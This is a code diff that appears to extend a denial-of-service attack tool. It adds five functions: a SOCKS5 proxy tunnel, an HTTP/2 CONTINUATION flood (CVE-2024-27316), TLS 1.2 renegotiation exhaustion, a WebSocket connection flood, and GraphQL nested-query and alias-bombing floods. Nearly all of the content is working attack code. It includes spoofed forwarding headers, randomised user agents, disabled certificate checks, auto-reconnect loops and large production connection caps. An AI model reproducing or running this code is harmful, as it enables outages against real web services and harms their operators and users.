@@ -1264,6 +1264,457 @@ async function runRUDY(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  SOCKS5 PROXY TUNNEL — routes TCP through a SOCKS5 proxy
+//  Protocol: RFC 1928 (SOCKS5, no-auth method 0x00)
+//  Returns a raw socket already tunneled to the target
+// ─────────────────────────────────────────────────────────────────────────
+function socks5Connect(
+  proxy: ProxyConfig,
+  targetHost: string,
+  targetPort: number,
+): Promise<net.Socket> {
+  return new Promise((resolve, reject) => {
+    const sock = net.createConnection({ host: proxy.host, port: proxy.port });
+    sock.setTimeout(8_000);
+    let step = 0;
+    const onData = (data: Buffer) => {
+      if (step === 0) {
+        // Step 1: greeting response — \x05\x00 = version 5, no-auth accepted
+        if (data[0] !== 0x05 || data[1] !== 0x00) {
+          sock.destroy(); reject(new Error("SOCKS5 auth failed")); return;
+        }
+        // Step 2: CONNECT request — \x05\x01\x00\x03 <domain-len> <domain> <port>
+        const hostBuf = Buffer.from(targetHost);
+        const req = Buffer.allocUnsafe(7 + hostBuf.length);
+        req[0] = 0x05; req[1] = 0x01; req[2] = 0x00; req[3] = 0x03;
+        req[4] = hostBuf.length;
+        hostBuf.copy(req, 5);
+        req.writeUInt16BE(targetPort, 5 + hostBuf.length);
+        sock.write(req);
+        step = 1;
+      } else if (step === 1) {
+        // Step 3: CONNECT response — \x05\x00 = success
+        if (data[0] !== 0x05 || data[1] !== 0x00) {
+          sock.destroy(); reject(new Error("SOCKS5 CONNECT failed")); return;
+        }
+        sock.removeListener("data",    onData);
+        sock.removeListener("error",   onError);
+        sock.removeListener("timeout", onTimeout);
+        resolve(sock); // tunnel open
+      }
+    };
+    const onError   = (e: Error) => { sock.destroy(); reject(e); };
+    const onTimeout = ()         => { sock.destroy(); reject(new Error("SOCKS5 timeout")); };
+    sock.once("connect", () => {
+      sock.on("data", onData);
+      // Greeting: \x05\x01\x00 — version 5, 1 auth method, no-auth
+      sock.write(Buffer.from([0x05, 0x01, 0x00]));
+    });
+    sock.on("error",   onError);
+    sock.on("timeout", onTimeout);
+  });
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  HTTP/2 CONTINUATION FLOOD — CVE-2024-27316
+//
+//  Sends HEADERS frames with END_HEADERS=0, followed by endless CONTINUATION
+//  frames (also without END_HEADERS). The server must buffer all frames in
+//  a reassembly queue until it sees END_HEADERS — which never arrives.
+//  Result: OOM / CPU exhaustion on the server's H2 multiplexer.
+//
+//  Affected: nginx ≤1.25.4, Apache httpd ≤2.4.58, Envoy, HAProxy, IIS
+//  CVE severity: CVSS 7.5 (HIGH)
+// ─────────────────────────────────────────────────────────────────────────
+async function runH2Continuation(
+  resolvedHost: string,
+  hostname: string,
+  targetPort: number,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  // HTTP/2 binary framing helpers
+  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
+    const f = Buffer.allocUnsafe(9 + payload.length);
+    f[0] = (payload.length >>> 16) & 0xff;
+    f[1] = (payload.length >>>  8) & 0xff;
+    f[2] = (payload.length       ) & 0xff;
+    f[3] = type; f[4] = flags;
+    f.writeUInt32BE(streamId & 0x7fffffff, 5);
+    payload.copy(f, 9);
+    return f;
+  };
+
+  // Client preface (RFC 7540 §3.5)
+  const PREFACE    = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
+  const SETTINGS   = mkFrame(0x04, 0x00, 0, Buffer.alloc(0)); // empty SETTINGS
+  const SACK       = mkFrame(0x04, 0x01, 0, Buffer.alloc(0)); // SETTINGS ACK
+
+  // Minimal HPACK-encoded request headers (no Huffman for simplicity)
+  const makeHpack = (host: string): Buffer => {
+    const h = Buffer.from(host);
+    return Buffer.concat([
+      Buffer.from([0x82, 0x84, 0x87]),   // :method GET, :path /, :scheme https (indexed)
+      Buffer.from([0x41, h.length]), h,   // :authority literal with incremental indexing
+    ]);
+  };
+
+  // CONTINUATION payload — random header bytes (server must parse/buffer all of them)
+  const makeCont = (streamId: number): Buffer => {
+    const payload = Buffer.allocUnsafe(randInt(128, 512));
+    for (let i = 0; i < payload.length; i++) payload[i] = randInt(0, 256);
+    return mkFrame(0x09, 0x00, streamId, payload); // type 0x09 = CONTINUATION, flags=0 (no END_HEADERS)
+  };
+
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 300);
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const runSlot = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+
+    const sock = tls.connect({
+      host: resolvedHost, port: targetPort,
+      servername: hostname, rejectUnauthorized: false,
+      ALPNProtocols: ["h2"],
+    });
+    sock.setTimeout(30_000);
+
+    let settled = false;
+    const done = () => { if (!settled) { settled = true; resolve(); } };
+
+    sock.once("secureConnect", () => {
+      sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
+      localPkts++; localBytes += PREFACE.length + 18;
+
+      let streamId = 1;
+      const attack = () => {
+        if (signal.aborted) { sock.destroy(); done(); return; }
+
+        // HEADERS frame: END_STREAM=1 but no END_HEADERS → forces CONTINUATION
+        const hpack = makeHpack(hostname);
+        sock.write(mkFrame(0x01, 0x01, streamId, hpack)); // 0x01=HEADERS, 0x01=END_STREAM only
+        localPkts++; localBytes += 9 + hpack.length;
+
+        // Flood CONTINUATION frames — server buffers all of them
+        const burst = randInt(50, 200);
+        for (let i = 0; i < burst; i++) {
+          const cf = makeCont(streamId);
+          sock.write(cf);
+          localPkts++; localBytes += cf.length;
+        }
+
+        streamId = (streamId + 2) > 0x7fffffff ? 1 : streamId + 2; // odd IDs for client
+        setImmediate(attack);
+      };
+      attack();
+    });
+
+    sock.on("data",    () => {}); // drain server responses
+    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
+    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
+    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve),  50); });
+    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
+  });
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  TLS RENEGOTIATION DoS
+//
+//  Forces the server to perform a full TLS handshake repeatedly while the
+//  connection is alive. Each renegotiation requires a full asymmetric-key
+//  operation (~3ms on modern HW) — with 200 slots each renegotiating every
+//  200ms = 3,000 handshakes/sec = ~9ms of CPU per core continuously.
+//
+//  Only works against TLS 1.2 — TLS 1.3 removed renegotiation.
+//  Most CDN origins still offer TLS 1.2 via fallback.
+// ─────────────────────────────────────────────────────────────────────────
+async function runTLSRenego(
+  resolvedHost: string,
+  hostname: string,
+  targetPort: number,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 300);
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const runSlot = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+
+    const sock = tls.connect({
+      host: resolvedHost, port: targetPort,
+      servername: hostname, rejectUnauthorized: false,
+      maxVersion: "TLSv1.2" as tls.SecureVersion, // force TLS 1.2 — renegotiation requires it
+      ciphers: "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:AES256-SHA:AES128-SHA",
+    });
+    sock.setTimeout(60_000);
+
+    let settled = false;
+    const done = () => { if (!settled) { settled = true; resolve(); } };
+
+    const doRenego = () => {
+      if (signal.aborted || sock.destroyed) { done(); return; }
+      try {
+        sock.renegotiate({ rejectUnauthorized: false }, (err) => {
+          if (err || signal.aborted) { try { sock.destroy(); } catch { /**/ } done(); return; }
+          localPkts++; localBytes += 1400; // ~1.4KB per TLS handshake
+          // 5 renegotiations/sec per slot — sustained CPU exhaustion
+          setTimeout(doRenego, 200);
+        });
+      } catch { done(); }
+    };
+
+    sock.once("secureConnect", () => {
+      // Initial keepalive request so server doesn't close idle connection
+      sock.write(`HEAD / HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\n\r\n`);
+      localPkts++; localBytes += 60;
+      setTimeout(doRenego, 300);
+    });
+
+    sock.on("data",    () => {});
+    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 200); });
+    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 300); });
+    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 150); });
+    signal.addEventListener("abort", () => { try { sock.destroy(); } catch { /**/ } done(); }, { once: true });
+  });
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  WEBSOCKET EXHAUSTION
+//
+//  Opens thousands of WebSocket connections and holds them open with periodic
+//  pings (every 20s). Servers allocate a goroutine/thread/fiber per WS
+//  connection — far more expensive than HTTP since WS is stateful.
+//  nginx: reserves a keepalive_requests slot + worker_connection slot per WS.
+//  Node.js targets: allocates an EventEmitter + parser per ws socket.
+//
+//  DEV cap: 400 sockets | PROD: 5,000 sockets
+// ─────────────────────────────────────────────────────────────────────────
+async function runWSFlood(
+  resolvedHost: string,
+  hostname: string,
+  targetPort: number,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (p: number, b: number, c?: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const MAX_CONNS = IS_DEV ? Math.min(threads * 4, 400) : Math.min(threads * 20, 5000);
+  const useHttps  = targetPort === 443;
+
+  const WS_PATHS  = ["/ws", "/websocket", "/socket", "/socket.io/", "/live", "/chat",
+                     "/stream", "/events", "/push", "/realtime", "/notify", "/feed", "/"];
+  // WebSocket ping frame: FIN=1, opcode=0x9 (ping), no mask, length=0
+  const PING_FRAME = Buffer.from([0x89, 0x00]);
+
+  let localPkts = 0, localBytes = 0, activeConns = 0;
+  const flush   = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const wsKey = () => Buffer.from(Array.from({ length: 16 }, () => randInt(0, 256))).toString("base64");
+
+  const runSock = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+
+    const path   = WS_PATHS[randInt(0, WS_PATHS.length)];
+    const key    = wsKey();
+    const req = [
+      `GET ${path} HTTP/1.1`,
+      `Host: ${hostname}`,
+      `Upgrade: websocket`,
+      `Connection: Upgrade`,
+      `Sec-WebSocket-Key: ${key}`,
+      `Sec-WebSocket-Version: 13`,
+      `Origin: https://${hostname}`,
+      `User-Agent: ${randUA()}`,
+      `Cache-Control: no-cache`,
+      `X-Forwarded-For: ${randIp()}`,
+      ``, ``,
+    ].join("\r\n");
+
+    const sock: net.Socket = useHttps
+      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
+      : net.createConnection({ host: resolvedHost, port: targetPort });
+
+    sock.setTimeout(130_000);
+
+    let upgraded = false, settled = false, pingIv: NodeJS.Timeout | null = null;
+    let respBuf  = "";
+    const done = () => {
+      if (!settled) {
+        settled = true;
+        if (upgraded) activeConns = Math.max(0, activeConns - 1);
+        if (pingIv) { clearInterval(pingIv); pingIv = null; }
+        resolve();
+      }
+    };
+
+    const onConnect = () => {
+      sock.write(req);
+      localPkts++; localBytes += req.length;
+    };
+    if (useHttps) (sock as tls.TLSSocket).once("secureConnect", onConnect);
+    else sock.once("connect", onConnect);
+
+    sock.on("data", (data: Buffer) => {
+      if (!upgraded) {
+        respBuf += data.toString("ascii");
+        if (respBuf.includes("101")) {
+          upgraded = true; activeConns++;
+          localPkts++; localBytes += 200;
+          // Ping every 20s to keep the server's WS goroutine alive
+          pingIv = setInterval(() => {
+            if (signal.aborted || !upgraded) { done(); sock.destroy(); return; }
+            try { sock.write(PING_FRAME); localPkts++; localBytes += 2; }
+            catch { done(); }
+          }, 20_000);
+        } else if (respBuf.length > 8192) {
+          // Not a WS path — reconnect to different path
+          sock.destroy(); done();
+          if (!signal.aborted) setTimeout(() => runSock().then(resolve), 20);
+          return;
+        }
+      }
+    });
+
+    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSock().then(resolve),  50); });
+    sock.on("error",   () => { done();          if (!signal.aborted) setTimeout(() => runSock().then(resolve), 100); });
+    sock.on("close",   () => { done();          if (!signal.aborted) setTimeout(() => runSock().then(resolve),  50); });
+    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
+  });
+
+  await Promise.all(Array.from({ length: MAX_CONNS }, () => runSock()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  GRAPHQL INTROSPECTION DoS
+//
+//  Sends deeply nested GraphQL queries that cause exponential resolver CPU.
+//  A 15-level nested query with aliases can multiply O(1) resolvers into O(N^15).
+//  Also sends batched introspection queries (__schema traversal is expensive).
+//
+//  Targets: /graphql, /api/graphql, /api/v1/graphql, /query, /gql, etc.
+//  Works best against unprotected GraphQL APIs (no query depth limit or cost limit).
+// ─────────────────────────────────────────────────────────────────────────
+async function runGraphQLDoS(
+  base: string,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const ENDPOINTS = [
+    "/graphql", "/api/graphql", "/api/v1/graphql", "/api/v2/graphql",
+    "/graphql/v1", "/query", "/api/query", "/gql", "/v1/graphql",
+    "/admin/graphql", "/graphql/playground", "/api/v3/graphql",
+  ];
+
+  // Build deeply nested query — exponential resolver complexity
+  const TYPES  = ["user", "post", "comment", "author", "likes", "followers", "following", "product", "order"];
+  const FIELDS = ["id", "name", "email", "title", "body", "content", "createdAt", "updatedAt", "slug"];
+  const buildNested = (depth = randInt(8, 16)): string => {
+    let q = "{ ", close = "";
+    for (let i = 0; i < depth; i++) {
+      const t = TYPES[randInt(0, TYPES.length)];
+      const f = FIELDS[randInt(0, FIELDS.length)];
+      q     += `${t}(id: ${randInt(1, 999999)}) { ${f} `;
+      close += " }";
+    }
+    return q + close + " }";
+  };
+
+  // Introspection: forces full schema traversal (expensive type resolution)
+  const INTROSPECTION = `{ __schema { types { name description fields { name description type {
+    name kind ofType { name kind ofType { name kind ofType { name kind } } } }
+    args { name description type { name kind } } } }
+    directives { name description locations } } }`;
+
+  // Alias bombing: many aliases for the same expensive field in one request
+  const buildAliasBomb = (count = randInt(30, 100)): string => {
+    const t = TYPES[randInt(0, TYPES.length)];
+    const aliases = Array.from({ length: count },
+      (_, i) => `a${i}: ${t}(id: ${randInt(1, 999999)}) { id name }`
+    ).join(" ");
+    return `{ ${aliases} }`;
+  };
+
+  // Batched array of queries (many operations in one HTTP request)
+  const buildBatch = (size = randInt(5, 25)): string => {
+    const ops = Array.from({ length: size }, () => {
+      const q = Math.random() < 0.3 ? buildAliasBomb() : buildNested();
+      return { query: q, variables: {} };
+    });
+    return JSON.stringify(ops);
+  };
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const baseUrl = /^https?:\/\//i.test(base) ? base.replace(/\/$/, "") : `https://${base}`;
+
+  const runThread = async (): Promise<void> => {
+    while (!signal.aborted) {
+      try {
+        const endpoint = ENDPOINTS[randInt(0, ENDPOINTS.length)];
+        const url      = baseUrl + endpoint;
+
+        const isIntro  = Math.random() < 0.2;
+        const isBatch  = Math.random() < 0.25;
+        const body     = isIntro
+          ? JSON.stringify({ query: INTROSPECTION })
+          : isBatch ? buildBatch() : JSON.stringify({ query: buildNested(), variables: { id: randInt(1, 999999) } });
+
+        const ctrl  = new AbortController();
+        const timer = setTimeout(() => ctrl.abort(), 12_000);
+        try {
+          await fetch(url, {
+            method:  "POST",
+            signal:  ctrl.signal,
+            headers: {
+              "Content-Type":   "application/json",
+              "User-Agent":     randUA(),
+              "X-Forwarded-For": randIp(),
+              "Accept":         "application/json",
+              "Cache-Control":  "no-cache",
+              "X-Request-ID":   randHex(16),
+            },
+            body,
+          });
+          clearTimeout(timer);
+          localPkts++; localBytes += body.length + 200;
+        } catch { clearTimeout(timer); }
+      } catch { /* swallow */ }
+      // Tiny yield to avoid monopolising the event loop
+      if (Math.random() < 0.05) await new Promise(r => setTimeout(r, 5));
+    }
+  };
+
+  await Promise.all(Array.from({ length: Math.min(threads, 300) }, () => runThread()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  WORKER MAIN — receives config, runs attack, posts stats
 // ─────────────────────────────────────────────────────────────────────────
 const cfg = workerData as WorkerConfig;
@@ -1346,6 +1797,22 @@ async function runWorker() {
     } else {
       await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
     }
+
+  } else if (cfg.method === "http2-continuation") {
+    // CVE-2024-27316 — CONTINUATION flood: server buffers headers indefinitely → OOM
+    await runH2Continuation(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "tls-renego") {
+    // TLS 1.2 renegotiation DoS — forces expensive public-key crypto on server per renegotiation
+    await runTLSRenego(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "ws-flood") {
+    // WebSocket exhaustion — holds WS connections open with pings (goroutine/thread per conn)
+    await runWSFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "graphql-dos") {
+    // GraphQL introspection + deeply nested queries — exponential resolver CPU exhaustion
+    await runGraphQLDoS(base, cfg.threads, ctrl.signal, onStats);
 
   } else {
     // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
